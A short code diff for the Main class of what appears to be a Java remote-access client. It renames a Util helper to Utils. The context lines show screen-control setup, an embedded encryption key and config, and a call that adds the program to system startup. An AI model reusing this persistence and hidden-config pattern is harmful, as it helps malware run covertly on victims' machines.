@@ -18,6 +18,7 @@ import javax.swing.ImageIcon;
 
 import com.redpois0n.common.crypto.Crypto;
 import com.redpois0n.common.os.OperatingSystem;
+import com.redpois0n.utils.Utils;
 
 public class Main {
 
@@ -47,7 +48,7 @@ public class Main {
 
 			robot = new Robot();
 
-			encryptionKey = Util.readString(Main.class.getResourceAsStream("/key.dat")).trim();
+			encryptionKey = Utils.readString(Main.class.getResourceAsStream("/key.dat")).trim();
 
 			InputStream configFileInputStream = Main.class.getResourceAsStream("/config.dat");
 			byte[] configBuffer = new byte[configFileInputStream.available()];
@@ -117,7 +118,7 @@ public class Main {
 				}
 			}
 
-			String currentJar = Util.getJarFile().getAbsolutePath();
+			String currentJar = Utils.getJarFile().getAbsolutePath();
 
 			try {
 				Startup.addToStartup(name);
